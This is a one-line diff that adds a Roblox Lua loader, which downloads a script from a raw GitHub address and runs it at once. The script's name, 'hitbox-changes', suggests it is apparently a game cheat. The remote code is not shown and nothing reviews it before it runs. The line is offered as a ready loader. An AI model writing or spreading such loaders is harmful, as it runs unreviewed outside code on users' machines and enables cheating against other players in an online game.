@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/hitbox-changes-azure-latch-spam5-n2x79xqgo38o8t.lua"))()
